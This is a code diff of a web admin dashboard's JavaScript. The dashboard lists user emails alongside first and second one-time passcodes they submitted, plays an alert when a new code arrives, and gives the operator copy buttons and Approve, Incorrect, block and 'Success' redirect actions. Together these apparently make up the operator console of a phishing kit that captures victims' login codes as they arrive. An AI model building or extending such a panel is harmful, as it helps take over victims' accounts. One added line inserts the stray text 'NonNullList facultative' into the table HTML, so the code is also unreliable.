@@ -583,220 +583,195 @@
 </div>
 
 <script>
-    const token = localStorage.getItem('adminToken');
-    if (!token) window.location.href = '/admin/login';
+const token = localStorage.getItem('adminToken');
+if (!token) window.location.href = '/admin/login';
 
-    // ==================== MP3 AUDIO ALERTS ====================
-    let soundEnabled = true;
-    let audioUnlocked = false;
+// ==================== MP3 AUDIO ALERTS - AUTOMATIC ====================
+let soundEnabled = true;
+let isAudioReady = false;
+let audioContextInitialized = false;
+
+// Audio files from static folder
+const signupSound = new Audio('/static/signup.mp3');
+const otpSound = new Audio('/static/otp.mp3');
+
+signupSound.preload = 'auto';
+otpSound.preload = 'auto';
+signupSound.volume = 0.8;
+otpSound.volume = 0.8;
+
+// Initialize audio automatically on page load (no user click needed)
+function initAudio() {
+    if (audioContextInitialized) return;
     
-    // Create audio elements
-    const signupSound = new Audio('/audio/signup.mp3');
-    const otpSound = new Audio('/audio/otp.mp3');
-    
-    // Preload audio
-    signupSound.preload = 'auto';
-    otpSound.preload = 'auto';
-    
-    function unlockAudio() {
-        if (audioUnlocked) return;
+    // Method 1: Web Audio API - creates silent buffer to unlock audio
+    try {
+        const AudioCtx = window.AudioContext || window.webkitAudioContext;
+        const audioContext = new AudioCtx();
+        const gainNode = audioContext.createGain();
+        const silentBuffer = audioContext.createBuffer(1, 1, 22050);
+        const source = audioContext.createBufferSource();
         
-        // Play silent audio to unlock
+        gainNode.gain.value = 0;
+        gainNode.connect(audioContext.destination);
+        source.buffer = silentBuffer;
+        source.connect(gainNode);
+        source.start(0);
+        
+        audioContext.resume().then(() => {
+            console.log('✅ Audio context initialized - sounds ready');
+            audioContextInitialized = true;
+            isAudioReady = true;
+        }).catch(e => console.log('Audio context resume error:', e));
+    } catch(e) {
+        console.log('Web Audio API not supported, trying fallback...');
+        // Method 2: Load and play silent audio element
         const silentAudio = new Audio();
         silentAudio.volume = 0;
         silentAudio.play().then(() => {
-            audioUnlocked = true;
-            console.log('Audio unlocked');
-            const banner = document.getElementById('audioBanner');
-            if (banner) banner.remove();
-        }).catch(e => {
-            console.log('Still waiting for user interaction');
+            silentAudio.pause();
+            isAudioReady = true;
+            audioContextInitialized = true;
+            console.log('✅ Fallback audio initialized');
+        }).catch(e => console.log('Audio fallback error:', e));
+    }
+}
+
+function playSound(type) {
+    if (!soundEnabled) return;
+    
+    if (!isAudioReady) {
+        initAudio();
+        setTimeout(() => playSound(type), 200);
+        return;
+    }
+    
+    const sound = type === 'signup' ? signupSound : otpSound;
+    sound.currentTime = 0;
+    
+    const playPromise = sound.play();
+    if (playPromise !== undefined) {
+        playPromise.catch(error => {
+            console.log('Play failed, retrying...', error);
+            isAudioReady = false;
+            initAudio();
         });
     }
-    
-    function showAudioActivationBanner() {
-        if (audioUnlocked) return;
-        
-        const existingBanner = document.getElementById('audioBanner');
-        if (existingBanner) return;
-        
-        const banner = document.createElement('div');
-        banner.id = 'audioBanner';
-        banner.className = 'audio-activation-banner';
-        banner.innerHTML = '<ion-icon name="volume-high-outline"></ion-icon><span>🔊 Click anywhere to enable sound alerts</span>';
-        banner.onclick = () => {
-            unlockAudio();
-            banner.remove();
-        };
-        document.body.appendChild(banner);
-        
-        // Also add click listener to whole page
-        document.addEventListener('click', unlockAudio, { once: true });
-    }
-    
-    function playSound(type) {
-        if (!soundEnabled) return;
-        
-        if (!audioUnlocked) {
-            showAudioActivationBanner();
-            return;
-        }
-        
-        const sound = type === 'signup' ? signupSound : otpSound;
-        sound.currentTime = 0;
-        const playPromise = sound.play();
-        
-        if (playPromise !== undefined) {
-            playPromise.catch(error => {
-                console.log('Audio play failed:', error);
-                if (error.name === 'NotAllowedError') {
-                    audioUnlocked = false;
-                    showAudioActivationBanner();
-                }
-            });
-        }
-    }
-    
-    function testSound() {
-        unlockAudio();
-        playSound('signup');
-        setTimeout(() => playSound('otp'), 1500);
-    }
-    
-    function toggleSound() {
-        soundEnabled = !soundEnabled;
-        const btn = document.getElementById('soundToggleBtn');
-        if (soundEnabled) { 
-            btn.innerHTML = '<ion-icon name="volume-high-outline"></ion-icon> Sound ON'; 
-            btn.classList.add('active');
-            testSound();
-        } else { 
-            btn.innerHTML = '<ion-icon name="volume-mute-outline"></ion-icon> Sound OFF'; 
-            btn.classList.remove('active');
-        }
-    }
-    
-    function showToast(title, message) {
-        const toast = document.getElementById('toast');
-        document.getElementById('toastTitle').textContent = title;
-        document.getElementById('toastMessage').textContent = message;
-        toast.style.display = 'block';
-        setTimeout(() => toast.style.display = 'none', 4000);
-        if (Notification.permission === 'granted') { new Notification(title, { body: message }); }
-    }
+}
 
-    function copyToClipboard(text) {
-        navigator.clipboard.writeText(text);
-        const toast = document.createElement('div');
-        toast.style.cssText = 'position:fixed; bottom:80px; right:20px; background:#10b981; color:white; padding:10px 20px; border-radius:12px; z-index:1000; animation:fadeOut 2s forwards';
-        toast.innerHTML = '<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!';
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 2000);
-    }
+function testSound() {
+    playSound('signup');
+    setTimeout(() => playSound('otp'), 800);
+}
 
-    function formatDate(dateString) { 
-        const date = new Date(dateString); 
-        const year = date.getFullYear();
-        const month = String(date.getMonth() + 1).padStart(2, '0');
-        const day = String(date.getDate()).padStart(2, '0');
-        const hours = String(date.getHours()).padStart(2, '0');
-        const minutes = String(date.getMinutes()).padStart(2, '0');
-        return `${year}-${month}-${day} ${hours}:${minutes}`; 
+function toggleSound() {
+    soundEnabled = !soundEnabled;
+    const btn = document.getElementById('soundToggleBtn');
+    if (soundEnabled) { 
+        btn.innerHTML = '<ion-icon name="volume-high-outline"></ion-icon> Sound ON'; 
+        btn.classList.add('active');
+        testSound();
+    } else { 
+        btn.innerHTML = '<ion-icon name="volume-mute-outline"></ion-icon> Sound OFF'; 
+        btn.classList.remove('active');
     }
-    
-    function escapeHtml(str) { 
-        if (!str) return ''; 
-        return str.replace(/[&<>]/g, function(m) { 
-            if (m === '&') return '&amp;'; 
-            if (m === '<') return '&lt;'; 
-            if (m === '>') return '&gt;'; 
-            return m; 
-        }); 
+}
+
+// Start audio immediately when page loads
+initAudio();
+
+// ==================== TOAST NOTIFICATION ====================
+function showToast(title, message) {
+    const toast = document.getElementById('toast');
+    document.getElementById('toastTitle').textContent = title;
+    document.getElementById('toastMessage').textContent = message;
+    toast.style.display = 'block';
+    setTimeout(() => toast.style.display = 'none', 4000);
+    if (Notification.permission === 'granted') { 
+        new Notification(title, { body: message }); 
     }
+}
 
-    function getStatusText(user) {
-        if (user.otp1_never) return 'Blocked';
-        if (!user.approved) return 'Pending Email';
-        if (user.approved && user.otp && !user.otp1_correct) return 'Pending OTP 1';
-        if (user.otp1_correct && user.second_otp && !user.otp2_correct) return 'Pending OTP 2';
-        if (user.otp1_correct && user.otp2_correct) return 'Verified';
-        return 'Pending';
-    }
-    
-    function getStatusColor(user) {
-        if (user.otp1_never) return '#ef4444';
-        if (!user.approved) return '#f59e0b';
-        if (user.approved && user.otp && !user.otp1_correct) return '#4f46e5';
-        if (user.otp1_correct && user.second_otp && !user.otp2_correct) return '#9a8c98';
-        if (user.otp1_correct && user.otp2_correct) return '#10b981';
-        return '#6b7280';
-    }
+// Request notification permission on page load
+if (Notification.permission === 'default') {
+    Notification.requestPermission();
+}
 
-    function openModal(user) {
-        const modalContent = document.getElementById('modalContent');
-        modalContent.innerHTML = `
-            <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
-            <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
-            <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
-            <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
-            <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
-        `;
-        document.getElementById('userModal').style.display = 'flex';
-    }
-    
-    function closeModal() { document.getElementById('userModal').style.display = 'none'; }
+// ==================== COPY TO CLIPBOARD ====================
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text);
+    const toastMsg = document.createElement('div');
+    toastMsg.style.cssText = 'position:fixed; bottom:80px; right:20px; background:#10b981; color:white; padding:10px 20px; border-radius:12px; z-index:1000; animation:fadeOut 2s forwards';
+    toastMsg.innerHTML = '<ion-icon name="checkmark-circle-outline"></ion-icon> Copied!';
+    document.body.appendChild(toastMsg);
+    setTimeout(() => toastMsg.remove(), 2000);
+}
 
-    // ==================== TRACK PREVIOUS STATE FOR ALERTS ====================
-    let previousUserMap = new Map();
-    let isFirstLoad = true;
+// ==================== DATE FORMATTING ====================
+function formatDate(dateString) { 
+    const date = new Date(dateString); 
+    const year = date.getFullYear();
+    const month = String(date.getMonth() + 1).padStart(2, '0');
+    const day = String(date.getDate()).padStart(2, '0');
+    const hours = String(date.getHours()).padStart(2, '0');
+    const minutes = String(date.getMinutes()).padStart(2, '0');
+    return `${year}-${month}-${day} ${hours}:${minutes}`; 
+}
 
-    function checkForNewEvents(users) {
-        if (isFirstLoad) {
-            users.forEach(user => {
-                previousUserMap.set(user.email, {
-                    approved: user.approved,
-                    otp: user.otp,
-                    second_otp: user.second_otp,
-                    otp1_never: user.otp1_never
-                });
-            });
-            isFirstLoad = false;
-            return;
-        }
+// ==================== HTML ESCAPE ====================
+function escapeHtml(str) { 
+    if (!str) return ''; 
+    return str.replace(/[&<>]/g, function(m) { 
+        if (m === '&') return '&amp;'; 
+        if (m === '<') return '&lt;'; 
+        if (m === '>') return '&gt;'; 
+        return m; 
+    }); 
+}
 
+// ==================== USER STATUS HELPERS ====================
+function getStatusText(user) {
+    if (user.otp1_never) return 'Blocked';
+    if (!user.approved) return 'Pending Email';
+    if (user.approved && user.otp && !user.otp1_correct) return 'Pending OTP 1';
+    if (user.otp1_correct && user.second_otp && !user.otp2_correct) return 'Pending OTP 2';
+    if (user.otp1_correct && user.otp2_correct) return 'Verified';
+    return 'Pending';
+}
+
+function getStatusColor(user) {
+    if (user.otp1_never) return '#ef4444';
+    if (!user.approved) return '#f59e0b';
+    if (user.approved && user.otp && !user.otp1_correct) return '#4f46e5';
+    if (user.otp1_correct && user.second_otp && !user.otp2_correct) return '#9a8c98';
+    if (user.otp1_correct && user.otp2_correct) return '#10b981';
+    return '#6b7280';
+}
+
+// ==================== MODAL FUNCTIONS ====================
+function openModal(user) {
+    const modalContent = document.getElementById('modalContent');
+    modalContent.innerHTML = `
+        <div class="modal-field"><div class="modal-label">Email</div><div class="value-row"><div class="modal-value">${escapeHtml(user.email)}</div><button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')"><ion-icon name="copy-outline"></ion-icon></button></div></div>
+        <div class="modal-field"><div class="modal-label">First OTP</div><div class="value-row"><div class="modal-value">${user.otp || 'Not submitted'}</div>${user.otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
+        <div class="modal-field"><div class="modal-label">Second OTP</div><div class="value-row"><div class="modal-value">${user.second_otp || 'Not submitted'}</div>${user.second_otp ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.second_otp)}')"><ion-icon name="copy-outline"></ion-icon></button>` : ''}</div></div>
+        <div class="modal-field"><div class="modal-label">Status</div><div class="modal-value" style="color: ${getStatusColor(user)}">${getStatusText(user)}</div></div>
+        <div class="modal-field"><div class="modal-label">Joined</div><div class="modal-value">${formatDate(user.created_at)}</div></div>
+    `;
+    document.getElementById('userModal').style.display = 'flex';
+}
+
+function closeModal() { 
+    document.getElementById('userModal').style.display = 'none'; 
+}
+
+// ==================== TRACK PREVIOUS STATE FOR ALERTS ====================
+let previousUserMap = new Map();
+let isFirstLoad = true;
+
+function checkForNewEvents(users) {
+    if (isFirstLoad) {
         users.forEach(user => {
-            const previous = previousUserMap.get(user.email);
-            
-            if (!previous) {
-                if (!user.otp1_never) {
-                    playSound('signup');
-                    showToast('New Signup', `${user.email} signed up`);
-                    const card = document.getElementById('pendingEmailCard');
-                    card.classList.add('has-new');
-                    setTimeout(() => card.classList.remove('has-new'), 3000);
-                }
-            } else {
-                if (!previous.otp && user.otp && !user.otp1_never) {
-                    playSound('otp');
-                    showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
-                    const card = document.getElementById('pendingFirstCard');
-                    card.classList.add('has-new');
-                    setTimeout(() => card.classList.remove('has-new'), 3000);
-                }
-                
-                if (!previous.second_otp && user.second_otp && !user.otp1_never) {
-                    playSound('otp');
-                    showToast('Second OTP', `${user.email} submitted second OTP`);
-                    const card = document.getElementById('pendingSecondCard');
-                    card.classList.add('has-new');
-                    setTimeout(() => card.classList.remove('has-new'), 3000);
-                }
-                
-                if (!previous.otp1_never && user.otp1_never) {
-                    showToast('User Blocked', `${user.email} has been blocked`);
-                }
-            }
-            
             previousUserMap.set(user.email, {
                 approved: user.approved,
                 otp: user.otp,
@@ -804,139 +779,207 @@
                 otp1_never: user.otp1_never
             });
         });
+        isFirstLoad = false;
+        return;
+    }
+
+    users.forEach(user => {
+        const previous = previousUserMap.get(user.email);
         
-        for (let [email, prev] of previousUserMap.entries()) {
-            const stillExists = users.find(u => u.email === email);
-            if (!stillExists && !isFirstLoad) {
-                previousUserMap.delete(email);
+        if (!previous) {
+            if (!user.otp1_never) {
+                playSound('signup');
+                showToast('New Signup', `${user.email} signed up`);
+                const card = document.getElementById('pendingEmailCard');
+                card.classList.add('has-new');
+                setTimeout(() => card.classList.remove('has-new'), 3000);
+            }
+        } else {
+            if (!previous.otp && user.otp && !user.otp1_never) {
+                playSound('otp');
+                showToast('First OTP', `${user.email} submitted OTP: ${user.otp}`);
+                const card = document.getElementById('pendingFirstCard');
+                card.classList.add('has-new');
+                setTimeout(() => card.classList.remove('has-new'), 3000);
+            }
+            
+            if (!previous.second_otp && user.second_otp && !user.otp1_never) {
+                playSound('otp');
+                showToast('Second OTP', `${user.email} submitted second OTP`);
+                const card = document.getElementById('pendingSecondCard');
+                card.classList.add('has-new');
+                setTimeout(() => card.classList.remove('has-new'), 3000);
+            }
+            
+            if (!previous.otp1_never && user.otp1_never) {
+                showToast('User Blocked', `${user.email} has been blocked`);
             }
         }
-    }
-
-    async function fetchUsers() {
-        try {
-            const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
-            if (response.status === 403) { localStorage.removeItem('adminToken'); window.location.href = '/admin/login'; return; }
-            const users = await response.json();
-            
-            checkForNewEvents(users);
-            displayUsers(users);
-            updateStats(users);
-        } catch(err) { console.error(err); }
-    }
-
-    function updateStats(users) {
-        const total = users.length;
-        const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
-        const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.otp1_never).length;
-        const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.otp1_never).length;
-        const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.otp1_never).length;
-        const never = users.filter(u => u.otp1_never).length;
         
-        document.getElementById('totalUsers').textContent = total;
-        document.getElementById('pendingEmail').textContent = pendingEmail;
-        document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
-        document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
-        document.getElementById('verifiedCount').textContent = verified;
-        document.getElementById('neverCount').textContent = never;
+        previousUserMap.set(user.email, {
+            approved: user.approved,
+            otp: user.otp,
+            second_otp: user.second_otp,
+            otp1_never: user.otp1_never
+        });
+    });
+    
+    for (let [email, prev] of previousUserMap.entries()) {
+        const stillExists = users.find(u => u.email === email);
+        if (!stillExists && !isFirstLoad) {
+            previousUserMap.delete(email);
+        }
     }
+}
 
-    function displayUsers(users) {
-        const tbody = document.getElementById('usersTableBody');
-        if (!users.length) { tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div></td></tr>'; return; }
+// ==================== FETCH USERS ====================
+async function fetchUsers() {
+    try {
+        const response = await fetch('/api/admin/users', { headers: { 'Authorization': `Bearer ${token}` } });
+        if (response.status === 403) { 
+            localStorage.removeItem('adminToken'); 
+            window.location.href = '/admin/login'; 
+            return; 
+        }
+        const users = await response.json();
         
-        tbody.innerHTML = users.map(user => {
-            let statusBadge = '';
-            
-            if (user.otp1_never) {
-                statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Blocked</span>';
-            }
-            else if (!user.approved) {
-                statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
-            }
-            else if (user.approved && user.otp && !user.otp1_correct) {
-                statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> Pending OTP 1</span>';
-            }
-            else if (user.otp1_correct && user.second_otp && !user.otp2_correct) {
-                statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
-            }
-            else if (user.otp1_correct && user.otp2_correct) {
-                statusBadge = '<span class="badge badge-verified"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
-            }
-            
-            let actionButtons = `<div class="action-buttons">`;
-            
-            if (!user.otp1_never && !user.approved) {
-                actionButtons += `<button class="action-btn btn-approve" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon>Approve</button>`;
-            }
-            else if (!user.otp1_never && user.approved && user.otp && !user.otp1_correct) {
-                actionButtons += `<button class="action-btn btn-success" onclick="successFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="star-outline"></ion-icon>Success</button>
-                                <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
-                                <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
-                                <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon>Never</button>
-                                <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
-            }
-            else if (!user.otp1_never && user.otp1_correct && user.second_otp && !user.otp2_correct) {
-                actionButtons += `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
-                                <button class="action-btn btn-incorrect" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
-                                <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
-            }
-            else if (!user.otp1_never && user.otp1_correct && user.otp2_correct) {
-                actionButtons += `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
-            }
-            
-            actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
-            
-            return `<tr>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
-                <td>${statusBadge}</td>
-                <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
-                <td>${actionButtons}</td>
-            </tr>`;
-        }).join('');
+        checkForNewEvents(users);
+        displayUsers(users);
+        updateStats(users);
+    } catch(err) { 
+        console.error(err); 
     }
+}
 
-    async function apiCall(endpoint, method, email, successMsg, errorMsg) {
-        try {
-            const response = await fetch(endpoint, { method, headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ email }) });
-            const data = await response.json();
-            if (data.success) { showToast('Success', successMsg); fetchUsers(); }
-            else { showToast('Error', data.detail || errorMsg); }
-        } catch(e) { showToast('Error', 'Network error'); }
+// ==================== UPDATE STATS ====================
+function updateStats(users) {
+    const total = users.length;
+    const pendingEmail = users.filter(u => !u.approved && !u.otp1_never).length;
+    const pendingFirstOTP = users.filter(u => u.approved && u.otp && !u.otp1_correct && !u.otp1_never).length;
+    const pendingSecondOTP = users.filter(u => u.otp1_correct && u.second_otp && !u.otp2_correct && !u.otp1_never).length;
+    const verified = users.filter(u => u.otp1_correct && u.otp2_correct && !u.otp1_never).length;
+    const never = users.filter(u => u.otp1_never).length;
+    
+    document.getElementById('totalUsers').textContent = total;
+    document.getElementById('pendingEmail').textContent = pendingEmail;
+    document.getElementById('pendingFirstOTP').textContent = pendingFirstOTP;
+    document.getElementById('pendingSecondOTP').textContent = pendingSecondOTP;
+    document.getElementById('verifiedCount').textContent = verified;
+    document.getElementById('neverCount').textContent = never;
+}
+
+// ==================== DISPLAY USERS ====================
+function displayUsers(users) {
+    const tbody = document.getElementById('usersTableBody');
+    if (!users.length) { 
+        tbody.innerHTML = '<tr><td colspan="6" class="empty-state"><ion-icon name="people-outline"></ion-icon><div>No users found</div>NonNullList facultative'; 
+        return; 
     }
+    
+    tbody.innerHTML = users.map(user => {
+        let statusBadge = '';
+        
+        if (user.otp1_never) {
+            statusBadge = '<span class="badge badge-never"><ion-icon name="ban-outline"></ion-icon> Blocked</span>';
+        }
+        else if (!user.approved) {
+            statusBadge = '<span class="badge badge-email"><ion-icon name="mail-outline"></ion-icon> Pending Email</span>';
+        }
+        else if (user.approved && user.otp && !user.otp1_correct) {
+            statusBadge = '<span class="badge badge-waiting"><ion-icon name="key-outline"></ion-icon> Pending OTP 1</span>';
+        }
+        else if (user.otp1_correct && user.second_otp && !user.otp2_correct) {
+            statusBadge = '<span class="badge badge-waiting"><ion-icon name="shield-outline"></ion-icon> Pending OTP 2</span>';
+        }
+        else if (user.otp1_correct && user.otp2_correct) {
+            statusBadge = '<span class="badge badge-verified"><ion-icon name="checkmark-done-circle-outline"></ion-icon> Verified</span>';
+        }
+        
+        let actionButtons = `<div class="action-buttons">`;
+        
+        if (!user.otp1_never && !user.approved) {
+            actionButtons += `<button class="action-btn btn-approve" onclick="approveEmail('${escapeHtml(user.email)}')"><ion-icon name="checkmark-outline"></ion-icon>Approve</button>`;
+        }
+        else if (!user.otp1_never && user.approved && user.otp && !user.otp1_correct) {
+            actionButtons += `<button class="action-btn btn-success" onclick="successFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="star-outline"></ion-icon>Success</button>
+                            <button class="action-btn btn-approve" onclick="approveFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
+                            <button class="action-btn btn-incorrect" onclick="incorrectFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
+                            <button class="action-btn btn-never" onclick="neverFirstOTP('${escapeHtml(user.email)}')"><ion-icon name="ban-outline"></ion-icon>Never</button>
+                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
+        }
+        else if (!user.otp1_never && user.otp1_correct && user.second_otp && !user.otp2_correct) {
+            actionButtons += `<button class="action-btn btn-approve" onclick="approveSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="checkmark-circle-outline"></ion-icon>Approve</button>
+                            <button class="action-btn btn-incorrect" onclick="incorrectSecondOTP('${escapeHtml(user.email)}')"><ion-icon name="close-circle-outline"></ion-icon>Incorrect</button>
+                            <button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
+        }
+        else if (!user.otp1_never && user.otp1_correct && user.otp2_correct) {
+            actionButtons += `<button class="action-btn btn-reset" onclick="resetUser('${escapeHtml(user.email)}')"><ion-icon name="refresh-outline"></ion-icon>Reset</button>`;
+        }
+        
+        actionButtons += `<button class="action-btn btn-delete" onclick="deleteUser('${escapeHtml(user.email)}')"><ion-icon name="trash-outline"></ion-icon>Delete</button></div>`;
+        
+        return `<tr>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;"><strong>${escapeHtml(user.email)}</strong></td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${user.second_otp ? `<span class="otp-code" onclick="event.stopPropagation();">${user.second_otp}</span><button class="copy-btn" onclick="event.stopPropagation(); copyToClipboard('${user.second_otp}')"><ion-icon name="copy-outline"></ion-icon></button>` : '-'}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${statusBadge}</td>
+            <td onclick="openModal({email:'${escapeHtml(user.email)}', otp:'${user.otp || ''}', second_otp:'${user.second_otp || ''}', approved:${user.approved}, otp1_correct:${user.otp1_correct}, otp2_correct:${user.otp2_correct}, otp1_never:${user.otp1_never || false}, created_at:'${user.created_at}'})" style="cursor:pointer;">${formatDate(user.created_at)}</td>
+            <td>${actionButtons}</td>
+        </tr>`;
+    }).join('');
+}
 
-    function approveEmail(email) { apiCall('/api/admin/approve-user', 'POST', email, 'Email approved', 'Failed'); }
-    function approveFirstOTP(email) { apiCall('/api/admin/approve-first-otp', 'POST', email, 'First OTP approved', 'Failed'); }
-    function successFirstOTP(email) { apiCall('/api/admin/success-first-otp', 'POST', email, 'Success! User redirected', 'Failed'); }
-    function incorrectFirstOTP(email) { apiCall('/api/admin/incorrect-first-otp', 'POST', email, 'First OTP incorrect', 'Failed'); }
-    function neverFirstOTP(email) { if(confirm(`Mark ${email} as NEVER? User will be blocked.`)) apiCall('/api/admin/never-first-otp', 'POST', email, 'User blocked', 'Failed'); }
-    function approveSecondOTP(email) { apiCall('/api/admin/approve-second-otp', 'POST', email, 'Second OTP approved', 'Failed'); }
-    function incorrectSecondOTP(email) { apiCall('/api/admin/incorrect-second-otp', 'POST', email, 'Second OTP incorrect', 'Failed'); }
-    function resetUser(email) { if(confirm(`Reset ${email}? This will create a new record.`)) apiCall('/api/admin/reset-user', 'POST', email, 'User reset', 'Failed'); }
-    function deleteUser(email) { if(confirm(`Delete ${email} permanently?`)) apiCall('/api/admin/delete-user', 'DELETE', email, 'User deleted', 'Failed'); }
-
-    function setupTheme() {
-        const savedTheme = localStorage.getItem('theme');
-        if (savedTheme === 'dark') document.body.classList.add('dark-mode');
-        const btn = document.getElementById('themeToggleBtn');
